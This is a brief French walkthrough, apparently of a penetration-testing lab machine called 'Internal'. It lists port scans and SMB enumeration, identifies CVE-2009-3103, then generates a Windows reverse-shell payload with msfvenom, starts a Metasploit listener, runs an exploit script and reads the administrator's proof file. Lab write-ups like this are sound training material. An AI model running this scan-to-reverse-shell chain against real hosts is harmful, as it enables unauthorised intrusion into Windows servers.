  # Internal

	sudo masscan -p1-65535,U:1-65535 192.168.240.40 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.240.40 -oN nmap.txt
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	53/tcp open domain Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)  
	135/tcp open msrpc Microsoft Windows RPC  
	139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
	445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)  
	3389/tcp open ssl/ms-wbt-server?  
	5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
	49150/tcp closed inspider  
	49151/tcp closed unknown  
	49152/tcp open msrpc Microsoft Windows RPC  
	49153/tcp open msrpc Microsoft Windows RPC  
	49154/tcp open msrpc Microsoft Windows RPC  
	49155/tcp open msrpc Microsoft Windows RPC  
	49156/tcp open msrpc Microsoft Windows RPC  
	49157/tcp open msrpc Microsoft Windows RPC  
	49158/tcp open msrpc Microsoft Windows RPC  
	49159/tcp closed unknown  
	49160/tcp closed unknown
   
  Pas de sites web.

	nmap -p53,135,139,445,3389,49152-49158 -A -T4 192.168.240.40  
	enum4linux 192.168.240.40  
	nmap --script smb-vuln* -p139,445 192.168.240.40

Scans complémentaires pour SMB.

On voit que cette VM est vulnérable au CVE-2009-3103 : 

	msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.194 LPORT=443 EXITFUNC=thread -f python
	msfconsole -x "use exploit/multi/handler;set payload windows/shell/reverse_tcp;set LHOST 192.168.45.194;set LPORT 443;run;"
	...
	python2.7  exploit_SMB_CVE-2009-3103.py
	...
	whoami
	type C:\Users\Administrator\Desktop\proof.txt
